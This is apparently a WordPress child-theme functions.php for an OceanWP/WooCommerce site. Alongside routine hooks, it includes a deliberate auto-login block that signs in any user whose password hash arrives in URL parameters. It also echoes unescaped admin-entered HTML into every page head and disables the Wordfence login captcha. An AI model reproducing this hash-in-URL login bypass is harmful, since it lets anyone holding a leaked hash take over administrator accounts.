<?php

/**
 * Child theme functions
 *
 * When using a child theme (see http://codex.wordpress.org/Theme_Development
 * and http://codex.wordpress.org/Child_Themes), you can override certain
 * functions (those wrapped in a function_exists() call) by defining them first
 * in your child theme's functions.php file. The child theme's functions.php
 * file is included before the parent theme's file, so the child theme
 * functions would be used.
 *
 * Text Domain: oceanwp
 * @link http://codex.wordpress.org/Plugin_API
 *
 */

/**
 * Load the parent style.css file
 *
 * @link http://codex.wordpress.org/Child_Themes
 */
function oceanwp_child_enqueue_parent_style()
{
    // Dynamically get version number of the parent stylesheet (lets browsers re-cache your stylesheet when you update your theme)
    $theme = wp_get_theme('OceanWP');
    $version = $theme->get('Version');
    // Load the stylesheet
    wp_enqueue_style('child-style', get_stylesheet_directory_uri() . '/style.css', array('oceanwp-style'), $version);
    wp_enqueue_script('child-script', get_stylesheet_directory_uri().'/script.js', ['jquery'], $version, null);
}

add_action('wp_enqueue_scripts', 'oceanwp_child_enqueue_parent_style');


/* add custom html header field to admin panel*/

add_filter('admin_init', 'my_general_settings_register_fields');

function my_general_settings_register_fields()
{
    register_setting('general', 'custom_html', 'esc_attr');
    add_settings_field('custom_html', '<label for="custom_html">' . __('Scripte im HTML-Head', 'custom_html') . '</label>', 'my_general_custom_html', 'general');
}

function my_general_custom_html()
{
    $custom_html = get_option('custom_html', '');
    echo '<textarea name="custom_html" rows="10" cols="50" id="custom_html" class="large-text code">' . $custom_html . '</textarea>';
}


/* Insert custom html code  */

function insert_header_code()
{
    echo html_entity_decode(get_option('custom_html'), ENT_QUOTES);
}

add_action('wp_head', 'insert_header_code');


/* Auto-login user coming from Gruender.de MGB */

if (isset($_GET['u']) and $_GET['h']) {
    $user = get_user_by('login', urldecode($_GET['u']));
    if (($user) && ($user->data->user_pass == urldecode($_GET['h']))) {
        wp_set_current_user($user->ID, $user->user_login);
        wp_set_auth_cookie($user->ID);
        do_action('wp_login', urldecode($_GET['u']), $user);
        wp_redirect(admin_url('index.php', 'https'));
        exit;
    }
    wp_redirect(home_url());
    exit;
}

/* Shorten Product Titles  */

function short_woocommerce_product_titles_chars($title, $id)
{
    if ((is_shop() || is_product_tag() || is_product_category()) && get_post_type($id) === 'product') {
        // Kicks in if the product title is longer than 60 characters
        if (strlen($title) > 48) {
            // Shortens it to 48 characters and adds ellipsis at the end
            return substr($title, 0, 48) . '...';
        }
    }
    return $title;
}

add_filter('the_title', 'short_woocommerce_product_titles_chars', 10, 2);


/* Change Logo on the Login Screen  */

function dsk_login_logo()
{
    ?>
    <style type="text/css">
        body.login div#login h1 a {
            background-image: url(https://lieblingstier123.de/dsk-logo.png);
            height: 77px;
            width: 320px;
            background-size: 320px 77px;
            background-repeat: no-repeat;
            padding-bottom: 30px;
        }
    </style>
    <?php
}

add_action('login_enqueue_scripts', 'dsk_login_logo');

// overriding methode to load customizer typography script
add_action('after_setup_theme', 'remove_oceanwp_preview_script', 0);
function remove_oceanwp_preview_script()
{
    remove_action('customize_preview_init', 'customize_preview_init');
}

add_action('customize_preview_init', 'customize_preview_init', 99);
function customize_preview_init()
{
    wp_enqueue_script( 'custom-oceanwp-typography-customize-preview', get_stylesheet_directory_uri() . '/oceanwp-custom-script/typography-customize-preview.js', array( 'customize-preview' ), OCEANWP_THEME_VERSION, true );
    wp_localize_script( 'custom-oceanwp-typography-customize-preview', 'oceanwp', array(
        'googleFontsUrl' 	=> '//fonts.googleapis.com',
        'googleFontsWeight' => '100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i',
    ) );

    if ( OCEANWP_WOOCOMMERCE_ACTIVE ) {
        wp_enqueue_script( 'custom-oceanwp-woo-typography-customize-preview', get_stylesheet_directory_uri() . '/oceanwp-custom-script/woo-typography-customize-preview.js', array( 'customize-preview' ), OCEANWP_THEME_VERSION, true );
        wp_localize_script( 'custom-oceanwp-woo-typography-customize-preview', 'oceanwp', array(
            'googleFontsUrl' 	=> '//fonts.googleapis.com',
            'googleFontsWeight' => '100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i',
        ) );
    }
}


////delete Elementor Cache after editor save
add_action('elementor/editor/after_save', 'clear_elementor_cache');
add_action('admin_init', 'clear_elementor_cache');
function clear_elementor_cache() {
    update_option( 'elementor_disable_color_schemes', 'yes' );
    // Make sure that Elementor loaded and the hook fired
    if ( did_action( 'elementor/loaded' ) ) {
        // Automatically purge and regenerate the Elementor CSS cache
        \Elementor\Plugin::instance()->files_manager->clear_cache();
    }
}

add_action( 'elementor/editor/before_enqueue_scripts', function() {
    wp_enqueue_script('child-script', get_stylesheet_directory_uri().'/script.js', ['jquery'], '1.0', null);
});

add_action('wp_dashboard_setup', function (){
    global $wp_meta_boxes;
    if(!is_super_admin()){
        unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_site_health']);
    }
});

// disable Wordfence captcha
add_filter( 'wordfence_ls_require_captcha', '__return_false' );